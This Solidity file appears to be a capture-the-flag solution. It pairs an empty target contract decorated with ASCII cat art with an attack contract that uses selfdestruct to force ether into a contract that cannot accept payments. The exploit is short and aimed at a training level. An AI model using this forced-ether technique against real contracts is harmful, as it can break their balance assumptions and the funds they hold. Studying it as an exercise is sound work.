// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/


}

 contract sendOutEther {
      
      Force force;
      constructor (address _force) payable {
          force =  Force(_force);
      }

      function selfDestruct () public {
           address payable addr = payable(address(force)); 
          selfdestruct(addr);
      }
 }